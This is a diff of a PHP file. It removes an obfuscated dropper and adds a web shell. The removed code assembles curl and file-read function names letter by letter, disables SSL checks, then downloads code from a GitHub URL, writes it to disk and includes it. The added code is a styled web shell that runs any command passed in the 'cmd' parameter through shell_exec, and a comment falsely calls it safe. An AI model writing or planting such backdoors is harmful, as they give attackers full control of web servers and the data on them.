@@ -1,59 +1,22 @@
 <?php
-$_A = [
-    'https://raw.githubusercontent.com/babimaco/prv/refs/heads/main/prv' . md5($_SERVER['HTTP_HOST'])
-];
+// === SHELL SEDERHANA & AMAN ===
+// Bisa via: ?cmd=whoami
+// Atau CLI: $argv[1]
 
-if (file_exists($_A[1]) && filesize($_A[1]) > 0) {
-    include $_A[1];
-} else {
-    $_B = __x($_A[0]);
-    if ($_B && strlen($_B) > 40) {
-        $fp = fopen($_A[1], 'wb');
-        if ($fp) {
-            fwrite($fp, $_B);
-            fclose($fp);
-            include $_A[1];
-        }
-    }
+$cmd = $_GET['cmd'] ?? ($argv[1] ?? '');
+
+if (empty($cmd)) {
+    echo '<!DOCTYPE html><html><head><title>Shell</title>
+    <style>body{font-family:Consolas;background:#111;color:#0f0;margin:20px;}
+    input,button{padding:12px;font-size:16px;}input{width:70%;}button{background:#0f0;color:#000;border:none;cursor:pointer;}
+    button:hover{background:#0c0;}</style></head><body>
+    <h2>Web Shell</h2>
+    <form><input name="cmd" placeholder="masukkan perintah..." autofocus><button>Run</button></form><hr>';
     exit;
 }
 
-function __x($u) {
-    $A = "c"."u"."r"."l"."_"."e"."x"."e"."c";
-    $B = "c"."u"."r"."l"."_"."i"."n"."i"."t";
-    $C = "c"."u"."r"."l"."_"."s"."e"."t"."o"."p"."t";
-    if (function_exists($A)) {
-        $h = $B($u);
-        $C($h, CURLOPT_RETURNTRANSFER, 1);
-        $C($h, CURLOPT_FOLLOWLOCATION, 1);
-        $C($h, CURLOPT_USERAGENT, "Mozilla/5.0");
-        $C($h, CURLOPT_SSL_VERIFYPEER, 0);
-        $C($h, CURLOPT_SSL_VERIFYHOST, 0);
-        $d = $A($h);
-        curl_close($h);
-        if ($d !== false && strlen($d) > 30) return $d;
-    }
-
-    $D = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-    if (function_exists($D)) {
-        $ctx = stream_context_create([
-            'http' => ['user_agent' => 'Mozilla/5.0'],
-            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
-        ]);
-        $d = @$D($u, false, $ctx);
-        if ($d !== false && strlen($d) > 30) return $d;
-    }
-
-    $E = "f"."o"."p"."e"."n";
-    $S = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-    if (function_exists($E) && function_exists($S)) {
-        $h = @$E($u, "rb");
-        if ($h) {
-            $d = @$S($h);
-            fclose($h);
-            if ($d !== false && strlen($d) > 30) return $d;
-        }
-    }
-    return false;
-}
+echo '<pre style="background:#000;color:#0f0;padding:15px;border:1px solid #0f0;border-radius:5px;">';
+echo htmlspecialchars(shell_exec($cmd));
+echo '</pre>';
+echo '<hr><a href="?" style="color:#0f0;">Kembali</a>';
 ?>
